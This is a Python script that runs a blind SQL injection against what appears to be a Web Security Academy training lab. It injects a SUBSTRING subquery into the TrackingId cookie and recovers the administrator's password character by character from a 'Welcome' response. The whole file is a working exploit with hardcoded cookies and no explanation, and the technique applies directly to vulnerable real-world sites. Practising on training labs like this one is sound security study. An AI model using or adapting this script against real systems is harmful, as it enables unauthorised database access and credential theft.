import requests
import string

#blind sql injection +AND+(SELECT+SUBSTRING(password,2,1)+FROM+users+WHERE+username='administrator')='a
for i in range (1,20):
	for j in string.ascii_lowercase + string.digits: #a to z plus 0 to 9
		response = requests.get(
			'https://ac351f491f276005c0f04dbf001900d3.web-security-academy.net',
			cookies={
				"TrackingId":f"BcI2rucH9zLPTxVU'+AND+(SELECT+SUBSTRING(password,{i},1)+FROM+users+WHERE+username='administrator')='{j}",
				"session":'N1YvHCozSE6h9hDkgBlIOoy3MX3k2rAf'
			})
		if response.status_code == 200:
			if 'Welcome' in response.text:
				print(f"Hit {i},{j}")
